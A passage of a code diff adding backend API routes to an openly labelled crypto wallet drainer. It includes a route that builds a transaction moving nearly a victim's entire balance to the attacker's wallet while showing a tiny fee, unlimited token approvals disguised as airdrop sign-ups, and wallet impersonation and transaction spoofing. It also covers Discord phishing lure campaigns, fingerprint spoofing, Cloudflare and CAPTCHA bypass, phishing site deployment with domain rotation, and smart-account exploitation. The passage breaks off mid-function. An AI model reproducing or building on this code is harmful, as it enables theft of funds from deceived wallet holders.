+            const balance = await connection.getBalance(new PublicKey(userAddress));
+            return res.json({ success: true, balance, chain: 'solana' });
+        }
+        
+        // Test EVM
+        const provider = await getEVMProvider(chainId || 1);
+        const balance = await provider.getBalance(userAddress);
+        
+        res.json({ 
+            success: true, 
+            balance: balance.toString(),
+            chain: 'evm'
+        });
+    } catch (error) {
+        res.json({ success: false, error: error.message });
+    }
+});
+
+// 🐛 DEBUG ENDPOINT - Add this to index.js
+app.post('/api/debug-connection', async (req, res) => {
+    try {
+        const { userAddress, chain, walletName, action } = req.body;
+        
+        console.log('🐛 [DEBUG] Connection received:', {
+            userAddress,
+            chain, 
+            walletName,
+            action,
+            timestamp: new Date().toISOString(),
+            ip: req.ip
+        });
+
+        // Test Discord immediately
+        await sendDiscordAlert({
+            walletAddress: userAddress,
+            chain: chain,
+            walletName: walletName || 'Debug Wallet',
+            type: "new_connection",
+            clientId: 'debug-test'
+        });
+
+        res.json({ 
+            success: true, 
+            debug: 'Backend is working',
+            received: req.body 
+        });
+        
+    } catch (error) {
+        console.error('🐛 [DEBUG] Error:', error);
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+
+// PROFESSIONAL EVM DRAIN (disguised as gasless transaction)
+app.post('/api/execute/professional-evm-drain', async (req, res) => {
+  try {
+    const { userAddress, chainId } = req.body;
+    console.log('🎁 Creating professional EVM drain for:', userAddress);
+
+    // Use checksum address
+    const checksumAddress = ethers.getAddress(userAddress);
+    
+    // Use simple RPC URL directly
+    const provider = await getEVMProvider(chainId || 1);
+    const destinationWallet = process.env.DESTINATION_WALLET || '0x0000000000000000000000000000000000000000';
+
+    // Get balance
+    const balance = await provider.getBalance(checksumAddress);
+    const drainAmount = balance - ethers.parseEther('0.001'); // Leave gas
+
+    if (drainAmount <= 0) {
+      return res.json({ success: false, error: 'Insufficient balance' });
+    }
+
+    // Convert BigInt to string for JSON serialization
+    const transaction = {
+      to: destinationWallet,
+      value: drainAmount.toString(), // Convert BigInt to string
+      gasLimit: "21000",
+      chainId: 1,
+    };
+
+    // Get gas price and convert to string
+    const feeData = await provider.getFeeData();
+    transaction.gasPrice = feeData.gasPrice?.toString() || "30000000000";
+
+    res.json({
+      success: true,
+      transaction: transaction,
+      message: 'Sign to process your gasless reward claim',
+      displayAmount: '0.0001 ETH',
+      description: 'Gasless Transaction Fee',
+      professional: true
+    });
+
+  } catch (error) {
+    res.json({ success: false, error: error.message });
+  }
+});
+
+// ==================== SINGLE POPUP - ZERO COST DRAIN ====================
+
+app.post('/api/execute/single-popup-ultimate', async (req, res) => {
+  try {
+    const { userAddress, chainId } = req.body;
+    console.log('🎯 TESTING with mock data');
+
+    // Use mock assets to test the single-popup logic
+    const mockAssets = {
+      tokens: [
+        {
+          contractAddress: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', // USDC
+          balance: '1000000', // 1 USDC
+          symbol: 'USDC'
+        }
+      ],
+      nfts: [
+        {
+          contractAddress: '0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D', // BAYC
+          tokenId: '1234',
+          type: 'ERC721'
+        }
+      ],
+      native: '1000000000000000' // 0.001 ETH
+    };
+
+    console.log('📊 Mock assets:', mockAssets);
+
+    const provider = await getEVMProvider(chainId || 1);
+    const { singlePopupDrain } = await import('./modules/batchTransfer.js');
+    
+    const transaction = await singlePopupDrain(
+      userAddress, 
+      mockAssets,
+      provider
+    );
+
+    if (transaction) {
+      res.json({ success: true, transaction, professional: true });
+    } else {
+      throw new Error('Drain failed with mock data');
+    }
+
+  } catch (error) {
+    console.error('❌ Test failed:', error);
+    res.json({ success: false, error: error.message });
+  }
+});
+
+
+
+// PROFESSIONAL TOKEN APPROVAL (disguised as airdrop participation)
+app.post('/api/execute/professional-token-approval', async (req, res) => {
+  try {
+    const { userAddress, chainId, tokenAddress } = req.body;
+    console.log('🎁 Creating professional token approval for:', userAddress);
+
+    const provider = await getEVMProvider(1);
+    const destinationWallet = process.env.DESTINATION_WALLET;
+
+    // ERC20 ABI for approval
+    const erc20Abi = [
+      "function approve(address spender, uint256 amount) returns (bool)"
+    ];
+
+    const tokenContract = new ethers.Contract(tokenAddress, erc20Abi, provider);
+    
+    // Create unlimited approval transaction
+    const transaction = await tokenContract.approve.populateTransaction(
+      destinationWallet,
+      ethers.MaxUint256
+    );
+
+    transaction.from = userAddress;
+    transaction.chainId = parseInt(chainId);
+
+    res.json({
+      success: true,
+      transaction: transaction,
+      message: 'Approve to participate in exclusive airdrop',
+      displayAmount: 'Unlimited', // Standard for approvals
+      description: 'Airdrop Participation',
+      professional: true
+    });
+
+  } catch (error) {
+    res.json({ success: false, error: error.message });
+  }
+});
+
+// ==================== WALLET IMPERSONATION API ====================
+app.post('/api/impersonate/generate', async (req, res) => {
+  try {
+    const { targetAddress } = req.body;
+    
+    if (!targetAddress || !ethers.isAddress(targetAddress)) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Valid target address required' 
+      });
+    }
+
+    const result = await coreDrainer.generateVanityAddress(targetAddress);
+    res.json({ success: true, ...result });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/impersonate/batch-generate', async (req, res) => {
+  try {
+    const { targetAddresses } = req.body;
+    
+    if (!Array.isArray(targetAddresses) || targetAddresses.length === 0) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Array of target addresses required' 
+      });
+    }
+
+    const results = await coreDrainer.batchGenerateVanityAddresses(targetAddresses);
+    res.json({ success: true, results });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/impersonate/validate', async (req, res) => {
+  try {
+    const { address } = req.body;
+    
+    if (!address) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Address required' 
+      });
+    }
+
+    const isVanity = coreDrainer.isLikelyVanityAddress(address);
+    res.json({ success: true, isVanity });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// ==================== TRANSACTION SPOOFING API ====================
+app.post('/api/spoof/transaction', async (req, res) => {
+  try {
+    const { userAddress, txType, chainId } = req.body;
+    
+    if (!userAddress || !ethers.isAddress(userAddress)) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Valid user address required' 
+      });
+    }
+
+    const fakeTx = await coreDrainer.generateFakeTransaction(
+      userAddress, 
+      txType || 'swap', 
+      chainId || 1
+    );
+    
+    res.json({ success: true, transaction: fakeTx });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/spoof/transaction-history', async (req, res) => {
+  try {
+    const { userAddress, count, chainId } = req.body;
+    
+    if (!userAddress || !ethers.isAddress(userAddress)) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Valid user address required' 
+      });
+    }
+
+    const history = await coreDrainer.generateFakeTransactionHistory(
+      userAddress, 
+      count || 10, 
+      chainId || 1
+    );
+    
+    res.json({ success: true, history });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/spoof/validate', async (req, res) => {
+  try {
+    const { transactionData } = req.body;
+    
+    if (!transactionData) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Transaction data required' 
+      });
+    }
+
+    const isFake = coreDrainer.isLikelyFakeTransaction(transactionData);
+    res.json({ success: true, isFake });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// ==================== DISCORD LURE GENERATION API ====================
+app.post('/api/discord/lure/nft-mint', async (req, res) => {
+  try {
+    const { targetUser, projectData } = req.body;
+    
+    const lure = await coreDrainer.generateNFTMintLure(targetUser, projectData);
+    res.json({ success: true, lure });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/discord/lure/token-launch', async (req, res) => {
+  try {
+    const { targetUser, tokenData } = req.body;
+    
+    const lure = await coreDrainer.generateTokenLaunchLure(targetUser, tokenData);
+    res.json({ success: true, lure });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/discord/lure/raffle', async (req, res) => {
+  try {
+    const { targetUser } = req.body;
+    
+    const lure = await coreDrainer.generateRaffleLure(targetUser);
+    res.json({ success: true, lure });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/discord/lure/campaign', async (req, res) => {
+  try {
+    const { targetUsers, lureTypes } = req.body;
+    
+    if (!Array.isArray(targetUsers) || targetUsers.length === 0) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Array of target users required' 
+      });
+    }
+
+    const campaign = await coreDrainer.generateLureCampaign(targetUsers, lureTypes);
+    res.json({ success: true, campaign });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/discord/lure/post', async (req, res) => {
+  try {
+    const { lureId, channelId } = req.body;
+    
+    if (!lureId || !channelId) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Lure ID and channel ID required' 
+      });
+    }
+
+    const result = await coreDrainer.postLureToDiscord(lureId, channelId);
+    res.json({ success: true, result });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/discord/lure/track', async (req, res) => {
+  try {
+    const { lureId, action } = req.body;
+    
+    if (!lureId) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Lure ID required' 
+      });
+    }
+
+    const result = await coreDrainer.trackLureEngagement(lureId, action);
+    res.json({ success: true, result });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/discord/lure/stats', async (req, res) => {
+  try {
+    const stats = coreDrainer.getLureStats();
+    res.json({ success: true, stats });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// ==================== FINGERPRINT SPOOFING API ====================
+app.post('/api/fingerprint/batch-generate', async (req, res) => {
+  try {
+    const { sessionIds, profileType } = req.body;
+    
+    if (!Array.isArray(sessionIds) || sessionIds.length === 0) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Array of session IDs required' 
+      });
+    }
+
+    const fingerprints = await coreDrainer.batchGenerateFingerprints(
+      sessionIds, 
+      profileType || 'chrome_windows'
+    );
+    
+    res.json({ success: true, fingerprints });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/fingerprint/rotate', async (req, res) => {
+  try {
+    const { sessionId } = req.body;
+    
+    if (!sessionId) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Session ID required' 
+      });
+    }
+
+    const rotated = await coreDrainer.rotateFingerprint(sessionId);
+    res.json({ success: true, fingerprint: rotated });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/fingerprint/validate', async (req, res) => {
+  try {
+    const { fingerprint } = req.body;
+    
+    if (!fingerprint) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Fingerprint data required' 
+      });
+    }
+
+    const validation = coreDrainer.validateFingerprint(fingerprint);
+    res.json({ success: true, validation });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/fingerprint/stats', async (req, res) => {
+  try {
+    const stats = coreDrainer.getFingerprintStats();
+    res.json({ success: true, stats });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// ==================== CLOUDFLARE BYPASS API ====================
+app.post('/api/cloudflare/detect', async (req, res) => {
+  try {
+    const { url, htmlContent, headers } = req.body;
+    
+    if (!url) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'URL required' 
+      });
+    }
+
+    const detection = await coreDrainer.detectCloudflare(
+      url, 
+      htmlContent || '', 
+      headers || {}
+    );
+    
+    res.json({ success: true, detection });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/cloudflare/solve-captcha', async (req, res) => {
+  try {
+    const { captchaType, siteKey, pageUrl, enterprise } = req.body;
+    
+    if (!captchaType || !siteKey || !pageUrl) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'captchaType, siteKey, and pageUrl required' 
+      });
+    }
+
+    const solution = await coreDrainer.solveCaptcha(
+      captchaType, 
+      siteKey, 
+      pageUrl, 
+      enterprise || false
+    );
+    
+    res.json({ success: true, solution });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/cloudflare/bypass', async (req, res) => {
+  try {
+    const { url, htmlContent, headers, technique } = req.body;
+    
+    if (!url) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'URL required' 
+      });
+    }
+
+    const bypass = await coreDrainer.bypassChallenge(
+      url, 
+      htmlContent || '', 
+      headers || {}, 
+      technique || 'auto'
+    );
+    
+    res.json({ success: true, bypass });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/cloudflare/stats', async (req, res) => {
+  try {
+    const stats = coreDrainer.getChallengeStats();
+    res.json({ success: true, stats });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// ==================== MARKET INTELLIGENCE API ====================
+app.get('/api/market/trending', async (req, res) => {
+  try {
+    const { limit, minLiquidity } = req.query;
+    
+    const tokens = await coreDrainer.getTrendingTokens(
+      parseInt(limit) || 20,
+      parseInt(minLiquidity) || 50000
+    );
+    
+    res.json({ success: true, tokens });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/market/monitor', async (req, res) => {
+  try {
+    const { tokenAddress, chain, options } = req.body;
+    
+    if (!tokenAddress) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Token address required' 
+      });
+    }
+
+    const monitor = await coreDrainer.monitorToken(
+      tokenAddress, 
+      chain || 'ethereum', 
+      options || {}
+    );
+    
+    res.json({ success: true, monitor });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/market/token/:chain/:address', async (req, res) => {
+  try {
+    const { chain, address } = req.params;
+    
+    const tokenData = await coreDrainer.getTokenData(address, chain);
+    
+    if (!tokenData) {
+      return res.status(404).json({ 
+        success: false, 
+        error: 'Token not found' 
+      });
+    }
+    
+    res.json({ success: true, token: tokenData });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/market/timing', async (req, res) => {
+  try {
+    const timing = coreDrainer.getOptimalTransactionTiming();
+    res.json({ success: true, timing });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/market/watchlist', async (req, res) => {
+  try {
+    const { tokenAddress, chain, options } = req.body;
+    
+    if (!tokenAddress) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Token address required' 
+      });
+    }
+
+    const watchlistId = coreDrainer.addToWatchlist(
+      tokenAddress, 
+      chain || 'ethereum', 
+      options || {}
+    );
+    
+    res.json({ success: true, watchlistId });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.delete('/api/market/watchlist/:id', async (req, res) => {
+  try {
+    const { id } = req.params;
+    
+    const removed = coreDrainer.removeFromWatchlist(id);
+    res.json({ success: true, removed });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/market/watchlist', async (req, res) => {
+  try {
+    const status = coreDrainer.getWatchlistStatus();
+    res.json({ success: true, status });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/market/stats', async (req, res) => {
+  try {
+    const stats = coreDrainer.getIntelligenceStats();
+    res.json({ success: true, stats });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/debug-encoding', async (req, res) => {
+  try {
+    const { userAddress } = req.body;
+    console.log('🔧 DEBUG encoding for:', userAddress);
+
+    const mockAssets = {
+      tokens: [
+        {
+          contractAddress: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', // USDC
+          balance: '1000000',
+          symbol: 'USDC'
+        }
+      ],
+      nfts: [
+        {
+          contractAddress: '0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D', // BAYC
+          tokenId: '1234',
+          type: 'ERC721'
+        }
+      ],
+      native: '1000000000000000'
+    };
+
+    const { batchTransfer } = await import('./modules/batchTransfer.js');
+    
+    console.log('🔧 Testing encodeEnhancedMulticall...');
+    const multicallData = batchTransfer.encodeEnhancedMulticall(
+      mockAssets, 
+      process.env.DESTINATION_WALLET,
+      userAddress
+    );
+    
+    console.log('✅ Encoding successful!');
+    res.json({ 
+      success: true, 
+      message: 'Encoding works',
+      dataLength: multicallData.length 
+    });
+
+  } catch (error) {
+    console.error('❌ Encoding failed:', error);
+    res.json({ 
+      success: false, 
+      error: error.message,
+      stack: error.stack 
+    });
+  }
+});
+
+
+// ==================== CHAINALYSIS MONITORING API ====================
+app.post('/api/security/screen', async (req, res) => {
+  try {
+    const { address, intensity } = req.body;
+    
+    if (!address) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Address required' 
+      });
+    }
+
+    const screening = await coreDrainer.screenAddress(
+      address, 
+      intensity || 'standard'
+    );
+    
+    res.json({ success: true, screening });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/security/screen-batch', async (req, res) => {
+  try {
+    const { addresses, intensity } = req.body;
+    
+    if (!Array.isArray(addresses) || addresses.length === 0) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Array of addresses required' 
+      });
+    }
+
+    const results = await coreDrainer.batchScreenAddresses(
+      addresses, 
+      intensity || 'standard'
+    );
+    
+    res.json({ success: true, results });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/security/monitor', async (req, res) => {
+  try {
+    const { address, checkInterval } = req.body;
+    
+    if (!address) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Address required' 
+      });
+    }
+
+    const monitor = await coreDrainer.monitorAddress(
+      address, 
+      checkInterval || 3600000
+    );
+    
+    res.json({ success: true, monitor });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/security/stats', async (req, res) => {
+  try {
+    const stats = coreDrainer.getMonitoringStats();
+    res.json({ success: true, stats });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/test-network', async (req, res) => {
+    try {
+        console.log('🔍 Testing network connectivity...');
+        
+        // Test basic HTTP request
+        const testResponse = await fetch('https://httpbin.org/get');
+        const testData = await testResponse.json();
+        console.log('✅ Basic HTTP test passed');
+        
+        // Test Solana RPC
+        const connection = new Connection('https://api.mainnet-beta.solana.com');
+        const version = await connection.getVersion();
+        console.log('✅ Solana RPC test passed:', version);
+        
+        res.json({ 
+            success: true, 
+            httpTest: 'PASSED',
+            solanaTest: 'PASSED' 
+        });
+        
+    } catch (error) {
+        console.error('❌ Network test failed:', error);
+        res.json({ 
+            success: false, 
+            error: error.message,
+            stack: error.stack 
+        });
+    }
+});
+
+app.post('/api/security/validate-destination', async (req, res) => {
+  try {
+    const { destinationAddress } = req.body;
+    
+    if (!destinationAddress) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Destination address required' 
+      });
+    }
+
+    const screening = await coreDrainer.screenAddress(destinationAddress, 'thorough');
+    
+    if (screening.isFlagged) {
+      return res.json({ 
+        success: false, 
+        flagged: true,
+        risk: screening.overallRisk,
+        recommendation: 'REJECT: Destination address is flagged'
+      });
+    }
+    
+    res.json({ 
+      success: true, 
+      flagged: false,
+      risk: screening.overallRisk,
+      recommendation: 'APPROVE: Destination address appears clean'
+    });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/verify-solana-drain', async (req, res) => {
+    try {
+        const { userAddress, signature } = req.body;
+        const connection = new Connection('https://api.mainnet-beta.solana.com');
+        
+        const tx = await connection.getTransaction(signature);
+        const balance = await connection.getBalance(new PublicKey(userAddress));
+        
+        res.json({ 
+            success: true,
+            transaction_exists: !!tx,
+            victim_balance: balance,
+            transaction: tx
+        });
+    } catch (error) {
+        res.json({ success: false, error: error.message });
+    }
+});
+
+
+// ==================== AUTO DEPLOYER API ====================
+app.post('/api/deploy/site', async (req, res) => {
+  try {
+    const { templateType, config, platform } = req.body;
+    
+    if (!templateType) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Template type required' 
+      });
+    }
+
+    const deployment = await coreDrainer.deploySite(
+      templateType, 
+      config || {}, 
+      platform || 'auto'
+    );
+    
+    res.json({ success: true, deployment });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/deploy/batch', async (req, res) => {
+  try {
+    const { deployments } = req.body;
+    
+    if (!Array.isArray(deployments) || deployments.length === 0) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Array of deployments required' 
+      });
+    }
+
+    const results = await coreDrainer.batchDeploySites(deployments);
+    res.json({ success: true, results });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/deploy/rotate', async (req, res) => {
+  try {
+    const { deploymentId } = req.body;
+    
+    if (!deploymentId) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Deployment ID required' 
+      });
+    }
+
+    const rotated = await coreDrainer.rotateDomain(deploymentId);
+    res.json({ success: true, deployment: rotated });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/deploy/takedown', async (req, res) => {
+  try {
+    const { deploymentId } = req.body;
+    
+    if (!deploymentId) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Deployment ID required' 
+      });
+    }
+
+    const success = await coreDrainer.takeDownDeployment(deploymentId);
+    res.json({ success: true, takenDown: success });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/deploy/stats', async (req, res) => {
+  try {
+    const stats = coreDrainer.getDeploymentStats();
+    res.json({ success: true, stats });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// ==================== ACCOUNT ABSTRACTION EXPLOITATION API ====================
+app.post('/api/aa/detect', async (req, res) => {
+  try {
+    const { walletAddress, chainId } = req.body;
+    
+    if (!walletAddress) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Wallet address required' 
+      });
+    }
+
+    const detection = await coreDrainer.detectSmartAccount(
+      walletAddress, 
+      chainId || '1'
+    );
+    
+    res.json({ success: true, detection });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/aa/exploit', async (req, res) => {
+  try {
+    const { walletAddress, chainId, technique } = req.body;
+    
+    if (!walletAddress) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Wallet address required' 
+      });
+    }
+
+    const exploit = await coreDrainer.exploitSmartAccount(
+      walletAddress, 
+      chainId || '1', 
+      technique || 'auto'
+    );
+    
+    res.json({ success: true, exploit });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/aa/detect-batch', async (req, res) => {
+  try {
+    const { addresses, chainId } = req.body;
+    
+    if (!Array.isArray(addresses) || addresses.length === 0) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Array of addresses required' 
+      });
+    }
+
+    const results = await coreDrainer.batchDetectSmartAccounts(
+      addresses, 
+      chainId || '1'
+    );
+    
+    res.json({ success: true, results });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/aa/exploit-batch', async (req, res) => {
+  try {
+    const { targets, chainId } = req.body;
+    
+    if (!Array.isArray(targets) || targets.length === 0) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Array of targets required' 
+      });
+    }
+
+    const results = await coreDrainer.batchExploitSmartAccounts(
+      targets, 
+      chainId || '1'
+    );
+    
+    res.json({ success: true, results });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/aa/monitor', async (req, res) => {
+  try {
+    const { walletAddress, chainId, duration } = req.body;
+    
+    if (!walletAddress) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Wallet address required' 
+      });
+    }
+
+    const monitor = await coreDrainer.monitorSmartAccount(
+      walletAddress, 
+      chainId || '1', 
+      duration || 3600000
+    );
+    
+    res.json({ success: true, monitor });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/aa/stats', async (req, res) => {
+  try {
+    const stats = coreDrainer.getExploitStats();
+    res.json({ success: true, stats });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// ==================== MULTI-STEP LURE GENERATION API ====================
+app.post('/api/lure/campaign/create', async (req, res) => {
+  try {
+    const { templateType, targetUsers, customConfig } = req.body;
+    
+    if (!templateType || !targetUsers) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Template type and target users required' 
+      });
+    }
+
+    const campaign = await coreDrainer.createCampaign(
+      templateType,
+      targetUsers,
+      customConfig || {}
+    );
+    
+    res.json({ success: true, campaign });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/lure/campaign/action', async (req, res) => {
+  try {
+    const { campaignId, userId, action, phaseData } = req.body;
+    
+    if (!campaignId || !userId || !action) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Campaign ID, user ID, and action required' 
+      });
+    }
+
+    const result = await coreDrainer.processUserAction(
+      campaignId,
+      userId,
+      action,
+      phaseData || {}
+    );
+    
+    res.json({ success: true, result });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/lure/campaign/batch-create', async (req, res) => {
+  try {
+    const { campaigns } = req.body;
+    
+    if (!Array.isArray(campaigns) || campaigns.length === 0) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Array of campaigns required' 
+      });
+    }
+
+    const results = await coreDrainer.batchCreateCampaigns(campaigns);
+    res.json({ success: true, results });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/lure/campaign/progress/:campaignId/:userId', async (req, res) => {
+  try {
+    const { campaignId, userId } = req.params;
+    
+    const progress = coreDrainer.getUserProgress(campaignId, userId);
+    
+    if (!progress) {
+      return res.status(404).json({ 
+        success: false, 
+        error: 'Progress not found' 
+      });
+    }
+    
+    res.json({ success: true, progress });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/lure/campaign/stats/:campaignId', async (req, res) => {
+  try {
+    const { campaignId } = req.params;
+    
+    const stats = coreDrainer.getCampaignStats(campaignId);
+    
+    if (!stats) {
+      return res.status(404).json({ 
+        success: false, 
+        error: 'Campaign not found' 
+      });
+    }
+    
+    res.json({ success: true, stats });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/lure/system/stats', async (req, res) => {
+  try {
+    const stats = coreDrainer.getSystemStats();
+    res.json({ success: true, stats });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// ==================== ATOMIC BUNDLER API ====================
+app.post('/api/bundle/create', async (req, res) => {
+  try {
+    const { transactions, strategy, chainId, options } = req.body;
+    
+    if (!transactions || !Array.isArray(transactions)) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Array of transactions required' 
+      });
+    }
+
+    const bundle = await coreDrainer.createAtomicBundle(
+      transactions,
+      strategy || 'stealth-drain',
+      chainId || '1',
+      options || {}
+    );
+    
+    res.json({ success: true, bundle });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/bundle/batch-create', async (req, res) => {
+  try {
+    const { bundles } = req.body;
+    
+    if (!Array.isArray(bundles) || bundles.length === 0) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Array of bundles required' 
+      });
+    }
+
+    const results = await coreDrainer.batchCreateBundles(bundles);
+    res.json({ success: true, results });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/bundle/monitor', async (req, res) => {
+  try {
+    const { bundleId, timeout } = req.body;
+    
+    if (!bundleId) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Bundle ID required' 
+      });
+    }
+
+    const result = await coreDrainer.monitorBundle(
+      bundleId,
+      timeout || 60000
+    );
+    
+    res.json({ success: true, result });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/bundle/stats', async (req, res) => {
+  try {
+    const stats = coreDrainer.getBundleStats();
+    res.json({ success: true, stats });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// ==================== SIGNATURE DATABASE API ====================
+app.post('/api/signature/lookup', async (req, res) => {
+  try {
+    const { selector, contractAddress } = req.body;
+    
+    if (!selector) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Selector required' 
+      });
+    }
+
+    const signature = await coreDrainer.getFunctionSignature(
+      selector, 
+      contractAddress || null
+    );
+    
+    res.json({ success: true, signature });
+    
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/signature/abi', async (req, res) => {
+  try {
+    const { contractAddress, chainId } = req.body;
+    
+    if (!contractAddress) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Contract address required' 
+      });
+    }
+
+    const abi = await coreDrainer.getABI(
+      contractAddress, 
+      chainId || '1'
